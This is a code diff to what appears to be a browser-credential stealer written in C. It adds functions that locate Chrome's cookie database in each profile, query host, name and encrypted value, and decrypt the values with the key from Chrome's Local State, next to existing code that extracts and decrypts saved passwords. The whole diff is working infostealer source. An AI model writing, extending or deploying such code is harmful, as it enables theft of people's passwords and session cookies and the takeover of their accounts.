@@ -12,6 +12,7 @@
 #define LF_CHROME__USERDATA_PATH "\\Google\\Chrome\\User Data"
 #define LF_CHROME__LOCALSTATE_A_PATH "\\Local State"
 #define LF_CHROME__LOGIN_DATA_A_PATH "\\Login Data"
+#define LF_CHROME__COOKIES_A_PATH "\\Network\\Cookies"
 
 struct LF_Chrome_login_data_struct
 {
@@ -30,6 +31,10 @@ struct LF_Chrome_data_struct
   struct LF_Utils_arraylist_struct *profile_path_list;
   struct LF_Utils_arraylist_struct *login_data_list;
   struct LF_Utils_arraylist_struct *cookie_data_list;
+
+  // TODO: add profile struct,
+  //       which contains the logins & cookies
+  //       to better separate the data
 };
 
 void
@@ -52,6 +57,13 @@ LF_Chrome__get_login_data_path (char *profile_path, char *out)
   strcpy (out, profile_path);
   strcat (out, LF_CHROME__LOGIN_DATA_A_PATH);
 }
+void
+LF_Chrome__get_cookies_path (char *profile_path, char *out)
+{
+  strcpy (out, profile_path);
+  strcat (out, LF_CHROME__COOKIES_A_PATH);
+}
+
 char *
 LF_Chrome__get_encryption_key (char *localstate_path, int *len)
 {
@@ -117,12 +129,39 @@ LF_Chrome__login_data_db_search_callback (
   login_data->password_value
       = LF_Crypter_decrypt_aes_256_gcm (decrypted_key, iv, tag, tag_len);
 
-  free (password_value);
   free (iv);
   free (tag);
 
   LF_Utils_arraylist_add ((struct LF_Utils_arraylist_struct *)data,
                           login_data);
+}
+void
+LF_Chrome__cookies_db_search_callback (char *decrypted_key, void *data,
+                                       struct LF_SQLite_entry_struct *entries)
+{
+  struct LF_Chrome_cookie_data_struct *cookie_data
+      = malloc (sizeof (struct LF_Chrome_cookie_data_struct));
+
+  cookie_data->host_key = strdup (entries[0].value);
+  cookie_data->name = strdup (entries[1].value);
+
+  char *encrypted_value = entries[2].value;
+  int encrypted_value_len = entries[2].value_len;
+
+  char *iv = NULL;
+  char *tag = NULL;
+  int tag_len = 0;
+  LF_Crypter_separate_iv_tag (encrypted_value, encrypted_value_len, &iv, &tag,
+                              &tag_len);
+
+  cookie_data->value
+      = LF_Crypter_decrypt_aes_256_gcm (decrypted_key, iv, tag, tag_len);
+
+  free (iv);
+  free (tag);
+
+  LF_Utils_arraylist_add ((struct LF_Utils_arraylist_struct *)data,
+                          cookie_data);
 }
 void
 LF_Chrome__populate_profile_arraylist (char *userdata_path,
@@ -167,12 +206,22 @@ LF_Chrome_populate_data (struct LF_Chrome_data_struct *out)
       char login_data_path[MAX_PATH];
       LF_Chrome__get_login_data_path (profile_path, login_data_path);
 
+      char cookies_path[MAX_PATH];
+      LF_Chrome__get_cookies_path (profile_path, cookies_path);
+
       {
         const char *sql
             = "SELECT action_url, username_value, password_value FROM logins";
         LF_SQLite_exec (login_data_path, sql,
                         LF_Chrome__login_data_db_search_callback,
                         decrypted_key, out->login_data_list);
+      }
+      {
+        const char *sql
+            = "SELECT host_key, name, encrypted_value FROM cookies";
+        LF_SQLite_exec (cookies_path, sql,
+                        LF_Chrome__cookies_db_search_callback,
+                        decrypted_key, out->cookie_data_list);
       }
     }
   free (encryption_key);
